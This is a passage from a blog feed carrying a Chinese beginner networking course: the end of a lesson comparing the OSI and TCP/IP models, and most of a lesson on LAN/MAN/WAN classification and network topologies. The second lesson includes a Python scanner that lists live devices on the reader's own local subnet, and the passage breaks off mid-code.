id="练习4：代码扩展">练习4：代码扩展</h3><p>修改演示程序，添加以下功能：</p><ol><li>显示每层数据的大小变化</li><li>模拟数据在传输过程中丢失的情况</li><li>添加错误检测和重传机制</li></ol><h2 id="📚-扩展阅读">📚 扩展阅读</h2><h3 id="OSI-vs-TCP-IP模型">OSI vs TCP/IP模型</h3><p>OSI是理论模型，TCP/IP是实际使用的模型：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livescript">OSI七层模型              TCP/IP四层模型<br>┌─────────────┐<br>│  应用层     │ <span class="hljs-string">\</span>        ┌─────────────┐<br>├─────────────┤  <span class="hljs-string">\</span>       │  应用层     │<br>│  表示层     │   &#125; ───&gt; │             │<br>├─────────────┤  /       │             │<br>│  会话层     │ /        └─────────────┘<br>├─────────────┤          ┌─────────────┐<br>│  传输层     │  ─────&gt;  │  传输层     │<br>├─────────────┤          └─────────────┘<br>│  网络层     │  ─────&gt;  ┌─────────────┐<br>├─────────────┤          │  网络层     │<br>│ 数据链路层  │ <span class="hljs-string">\</span>        └─────────────┘<br>├─────────────┤  &#125; ───&gt;  ┌─────────────┐<br>│  物理层     │ /        │ 网络接口层  │<br>└─────────────┘          └─────────────┘<br></code></pre></td></tr></table></figure><p><strong>明天我们将详细学习TCP/IP模型！</strong></p><h2 id="🎯-明天预告">🎯 明天预告</h2><p><strong>第4天：TCP/IP四层模型</strong></p><p>我们将学习：</p><ul><li>TCP/IP模型和OSI模型的区别</li><li>TCP/IP各层的详细功能</li><li>实际网络中如何使用TCP/IP</li><li>编写程序分析真实的网络数据包</li></ul><hr><p>💡 <strong>今日金句</strong>：分层不是为了复杂化，而是为了简单化！</p><p>👉 <a href="day02.md">上一天：网络的分类和拓扑结构</a> | <a href="../../README.md">返回目录</a> | <a href="day04.md">下一天：TCP/IP四层模型</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2天：网络的分类和拓扑结构</title>
    <link href="/2025/11/10/2%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%88%86%E7%B1%BB%E5%92%8C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84/"/>
    <url>/2025/11/10/2%E5%A4%A9%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%88%86%E7%B1%BB%E5%92%8C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1>第2天：网络的分类和拓扑结构</h1><blockquote><p>“网络就像城市的交通系统，有不同的规模和不同的连接方式。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解网络的分类（LAN、WAN、MAN）</li><li>掌握网络拓扑结构的类型</li><li>编写程序：扫描局域网设备</li></ul><h2 id="🌐-网络的分类">🌐 网络的分类</h2><h3 id="按地理范围分类">按地理范围分类</h3><h4 id="1-局域网（LAN-Local-Area-Network）">1. 局域网（LAN - Local Area Network）</h4><p><strong>定义</strong>：覆盖范围较小的网络，通常在一个建筑物或校园内。</p><p><strong>生活中的例子</strong>：</p><ul><li>你家里的WiFi网络</li><li>公司办公室的网络</li><li>网吧的网络</li><li>学校机房的网络</li></ul><p><strong>特点</strong>：</p><ul><li>📏 范围：几米到几公里</li><li>🚀 速度：很快（100Mbps - 10Gbps）</li><li>💰 成本：低</li><li>👥 归属：个人或单位所有</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">类比理解：<br>局域网 <span class="hljs-operator">=</span> 你家的内部电话系统<br>只能在家里几个房间之间通话<br></code></pre></td></tr></table></figure><h4 id="2-城域网（MAN-Metropolitan-Area-Network）">2. 城域网（MAN - Metropolitan Area Network）</h4><p><strong>定义</strong>：覆盖一个城市范围的网络。</p><p><strong>生活中的例子</strong>：</p><ul><li>城市的有线电视网络</li><li>城市公共WiFi网络</li><li>城市监控网络</li></ul><p><strong>特点</strong>：</p><ul><li>📏 范围：几十公里</li><li>🚀 速度：较快</li><li>💰 成本：中等</li><li>👥 归属：通常是运营商或政府</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">类比理解：<br>城域网 <span class="hljs-operator">=</span> 城市的公交系统<br>连接城市内的不同区域<br></code></pre></td></tr></table></figure><h4 id="3-广域网（WAN-Wide-Area-Network）">3. 广域网（WAN - Wide Area Network）</h4><p><strong>定义</strong>：覆盖很大地理范围的网络，可以跨越国家和大洲。</p><p><strong>生活中的例子</strong>：</p><ul><li>互联网（Internet）</li><li>跨国公司的专用网络</li><li>电信运营商的骨干网</li></ul><p><strong>特点</strong>：</p><ul><li>📏 范围：几百到几万公里</li><li>🚀 速度：相对较慢</li><li>💰 成本：高</li><li>👥 归属：运营商或大型组织</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">类比理解：<br>广域网 <span class="hljs-operator">=</span> 国际航空网络<br>连接世界各地的城市<br></code></pre></td></tr></table></figure><h3 id="对比总结">对比总结</h3><table><thead><tr><th>类型</th><th>覆盖范围</th><th>传输速度</th><th>延迟</th><th>例子</th></tr></thead><tbody><tr><td>LAN</td><td>10m - 1km</td><td>最快</td><td>最低</td><td>家庭WiFi</td></tr><tr><td>MAN</td><td>10km - 100km</td><td>较快</td><td>较低</td><td>城市网络</td></tr><tr><td>WAN</td><td>100km+</td><td>较慢</td><td>较高</td><td>互联网</td></tr></tbody></table><h2 id="🔷-网络拓扑结构">🔷 网络拓扑结构</h2><p><strong>拓扑结构</strong>就是网络中各个设备的连接方式和布局形状。</p><h3 id="1-总线型拓扑（Bus-Topology）">1. 总线型拓扑（Bus Topology）</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">设备A</span> <span class="hljs-literal">---</span> <span class="hljs-comment">设备B</span> <span class="hljs-literal">---</span> <span class="hljs-comment">设备C</span> <span class="hljs-literal">---</span> <span class="hljs-comment">设备D</span><br>         <span class="hljs-comment">|                      |</span><br>       <span class="hljs-comment">(总线)                (总线)</span><br></code></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li>✅ 优点：布线简单，成本低</li><li>❌ 缺点：总线断了，整个网络瘫痪</li><li>📝 应用：早期以太网</li></ul><p><strong>类比</strong>：公交线路，所有站点都在一条线上</p><h3 id="2-星型拓扑（Star-Topology）">2. 星型拓扑（Star Topology）</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">        设备B<br>          <span class="hljs-string">|</span><br>设备A <span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span> 交换机 <span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span> 设备C<br>          <span class="hljs-string">|</span><br>        设备D<br></code></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li>✅ 优点：一个设备故障不影响其他设备</li><li>✅ 管理方便，易于排错</li><li>❌ 缺点：中心设备（交换机）故障，整个网络瘫痪</li><li>📝 应用：<strong>现代最常用的拓扑结构</strong></li></ul><p><strong>类比</strong>：太阳系，所有行星围绕太阳转</p><h3 id="3-环型拓扑（Ring-Topology）">3. 环型拓扑（Ring Topology）</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">设备A <span class="hljs-comment">--- 设备B</span><br>  |          |<br>设备D <span class="hljs-comment">--- 设备C</span><br></code></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li>✅ 优点：数据传输路径确定</li><li>❌ 缺点：一个设备故障影响整个网络</li><li>📝 应用：令牌环网络（已较少使用）</li></ul><p><strong>类比</strong>：接力赛跑，每个人传递给下一个人</p><h3 id="4-网状型拓扑（Mesh-Topology）">4. 网状型拓扑（Mesh Topology）</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">设备A --- 设备B<br> |<span class="hljs-string"> \    / </span>|<br> |<span class="hljs-string">  \ /   </span>|<br> |<span class="hljs-string">  / \   </span>|<br> |<span class="hljs-string"> /    \ </span>|<br>设备D --- 设备C<br></code></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li>✅ 优点：可靠性极高，有多条路径</li><li>❌ 缺点：布线复杂，成本高</li><li>📝 应用：军事网络、互联网骨干</li></ul><p><strong>类比</strong>：地铁网络，有多条线路可选</p><h3 id="5-树型拓扑（Tree-Topology）">5. 树型拓扑（Tree Topology）</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">     根交换机<br>     /      <span class="hljs-string">\</span><br>  交换机A   交换机B<br>  /   <span class="hljs-string">\</span>      /   <span class="hljs-string">\</span><br>设备<span class="hljs-number">1</span> 设备<span class="hljs-number">2</span> 设备<span class="hljs-number">3</span> 设备<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p><strong>特点</strong>：</p><ul><li>✅ 优点：易于扩展，层次清晰</li><li>❌ 缺点：根节点故障影响所有下级</li><li>📝 应用：企业网络、校园网</li></ul><p><strong>类比</strong>：公司组织架构</p><h2 id="🔧-实战项目：局域网设备扫描器">🔧 实战项目：局域网设备扫描器</h2><p>让我们编写一个程序，扫描你所在局域网内的所有设备！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day02_lan_scanner.py</span><br><span class="hljs-comment"># 功能：扫描局域网内的活跃设备</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ipaddress<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, as_completed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip_and_subnet</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取本机IP地址和所在的子网</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        local_ip: 本机IP地址字符串</span><br><span class="hljs-string">        subnet: 子网字符串（如 &quot;192.168.1.0/24&quot;）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 创建socket连接到外部地址，获取本机IP</span><br>        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        sock.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br>        local_ip = sock.getsockname()[<span class="hljs-number">0</span>]<br>        sock.close()<br><br>        <span class="hljs-comment"># 从IP地址推断子网（假设是/24子网）</span><br>        <span class="hljs-comment"># 例如：192.168.1.100 -&gt; 192.168.1.0/24</span><br>        ip_parts = local_ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        subnet = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">0</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">1</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">2</span>]&#125;</span>.0/24&quot;</span><br><br>        <span class="hljs-keyword">return</span> local_ip, subnet<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;获取本机IP失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_host</span>(<span class="hljs-params">ip, timeout=<span class="hljs-number">0.5</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检查指定IP的主机是否在线</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        ip: 要检查的IP地址</span><br><span class="hljs-string">        timeout: 超时时间（秒）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        如果主机在线，返回(ip, hostname)</span><br><span class="hljs-string">        如果主机不在线，返回None</span><br><span class="hljs-string"></span><br><span class="hljs-string">    工作原理：</span><br><span class="hljs-string">        尝试连接到目标IP的常用端口（80端口）</span><br><span class="hljs-string">        如果能连接，说明主机在线</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 尝试连接到80端口（HTTP端口）</span><br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        sock.settimeout(timeout)<br><br>        <span class="hljs-comment"># 尝试连接</span><br>        result = sock.connect_ex((<span class="hljs-built_in">str</span>(ip), <span class="hljs-number">80</span>))<br><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># 连接成功，尝试获取主机名</span><br>            <span class="hljs-keyword">try</span>:<br>                hostname = socket.gethostbyaddr(<span class="hljs-built_in">str</span>(ip))[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">except</span>:<br>                hostname = <span class="hljs-string">&quot;未知主机名&quot;</span><br><br>            sock.close()<br>            <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(ip), hostname)<br>        <span class="hljs-keyword">else</span>:<br>            sock.close()<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping_check</span>(<span class="hljs-params">ip, timeout=<span class="hljs-number">0.5</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用更简单的方法检测主机是否在线</span><br><span class="hljs-string">    尝试多个常用端口</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    common_ports = [<span class="hljs-number">80</span>, <span class="hljs-number">443</span>, <span class="hljs-number">22</span>, <span class="hljs-number">445</span>, <span class="hljs-number">139</span>]  <span class="hljs-comment"># HTTP, HTTPS, SSH, SMB</span><br><br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> common_ports:<br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>            sock.settimeout(timeout)<br>            result = sock.connect_ex((<span class="hljs-built_in">str</span>(ip), port))<br>            sock.close()<br><br>            <span class="hljs-keyword">if</span> result == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># 尝试获取主机名</span><br>                <span class="hljs-keyword">try</span>:<br>                    hostname = socket.gethostbyaddr(<span class="hljs-built_in">str</span>(ip))[<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">except</span>:<br>                    hostname = <span class="hljs-string">&quot;未知主机名&quot;</span><br><br>                <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(ip), hostname, port)<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_network</span>(<span class="hljs-params">subnet, max_workers=<span class="hljs-number">50</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    扫描整个子网</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        subnet: 子网地址（如 &quot;192.168.1.0/24&quot;）</span><br><span class="hljs-string">        max_workers: 最大线程数</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回：</span><br><span class="hljs-string">        活跃主机列表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 解析子网，获取所有IP地址</span><br>    network = ipaddress.ip_network(subnet, strict=<span class="hljs-literal">False</span>)<br>    total_hosts = network.num_addresses - <span class="hljs-number">2</span>  <span class="hljs-comment"># 减去网络地址和广播地址</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔍 开始扫描子网: <span class="hljs-subst">&#123;subnet&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📊 总共需要扫描 <span class="hljs-subst">&#123;total_hosts&#125;</span> 个IP地址&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;⏳ 请稍候...\n&quot;</span>)<br><br>    active_hosts = []<br>    scanned = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># 使用线程池并发扫描</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=max_workers) <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># 提交所有扫描任务</span><br>        future_to_ip = &#123;<br>            executor.submit(ping_check, ip): ip<br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> network.hosts()  <span class="hljs-comment"># 排除网络地址和广播地址</span><br>        &#125;<br><br>        <span class="hljs-comment"># 处理完成的任务</span><br>        <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(future_to_ip):<br>            scanned += <span class="hljs-number">1</span><br>            result = future.result()<br><br>            <span class="hljs-keyword">if</span> result:<br>                ip, hostname, port = result<br>                active_hosts.append((ip, hostname, port))<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ 发现设备: <span class="hljs-subst">&#123;ip:<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;hostname:<span class="hljs-number">30</span>&#125;</span> | 端口: <span class="hljs-subst">&#123;port&#125;</span>&quot;</span>)<br><br>            <span class="hljs-comment"># 显示进度</span><br>            <span class="hljs-keyword">if</span> scanned % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br>                progress = (scanned / total_hosts) * <span class="hljs-number">100</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   进度: <span class="hljs-subst">&#123;progress:<span class="hljs-number">.1</span>f&#125;</span>% (<span class="hljs-subst">&#123;scanned&#125;</span>/<span class="hljs-subst">&#123;total_hosts&#125;</span>)&quot;</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> active_hosts<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">display_topology</span>(<span class="hljs-params">active_hosts, local_ip</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    显示网络拓扑结构（简化版）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;网络拓扑结构（星型拓扑）&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;                      [路由器/交换机]&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;                             |&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;          &quot;</span> + <span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">40</span>)<br><br>    <span class="hljs-keyword">for</span> ip, hostname, port <span class="hljs-keyword">in</span> active_hosts:<br>        marker = <span class="hljs-string">&quot; (本机)&quot;</span> <span class="hljs-keyword">if</span> ip == local_ip <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;          |-- [<span class="hljs-subst">&#123;ip&#125;</span>] <span class="hljs-subst">&#123;hostname&#125;</span><span class="hljs-subst">&#123;marker&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;局域网设备扫描器&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 获取本机IP和子网</span><br>    local_ip, subnet = get_local_ip_and_subnet()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> local_ip:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 无法获取本机IP地址，请检查网络连接！&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📍 本机IP: <span class="hljs-subst">&#123;local_ip&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🌐 所在子网: <span class="hljs-subst">&#123;subnet&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># 扫描网络</span><br>    active_hosts = scan_network(subnet)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✨ 扫描完成！共发现 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(active_hosts)&#125;</span> 台活跃设备&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>    <span class="hljs-comment"># 显示详细信息</span><br>    <span class="hljs-keyword">if</span> active_hosts:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n📋 活跃设备列表：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;IP地址&#x27;</span>:&lt;<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;主机名&#x27;</span>:&lt;<span class="hljs-number">30</span>&#125;</span> | <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;开放端口&#x27;</span>&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">for</span> ip, hostname, port <span class="hljs-keyword">in</span> active_hosts:<br>            marker = <span class="hljs-string">&quot; ⭐&quot;</span> <span class="hljs-keyword">if</span> ip == local_ip <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">15</span>&#125;</span> | <span class="hljs-subst">&#123;hostname:&lt;<span class="hljs-number">30</span>&#125;</span> | <span class="hljs-subst">&#123;port&#125;</span><span class="hljs-subst">&#123;marker&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># 显示拓扑结构</span><br>        display_topology(active_hosts, local_ip)<br><br>        <span class="hljs-comment"># 分析网络类型</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n💡 网络分析：&quot;</span>)<br>        <span 